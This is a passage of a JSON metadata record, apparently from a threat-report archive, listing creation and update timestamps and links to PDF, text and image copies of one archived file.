    "ts_created_at": 1673535832,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653756486,
    "ts_modification_date": 1653756486,
    "files": {
        "pdf": "https://archive.orkl.eu/94a9634fd7acf7aaa447123b3b23dc1ee7b64beb.pdf",
        "text": "https://archive.orkl.eu/94a9634fd7acf7aaa447123b3b23dc1ee7b64beb.txt",
        "img": "https://archive.orkl.eu/94a9634fd7acf7aaa447123b3b23dc1ee7b64beb.jpg"
    }
}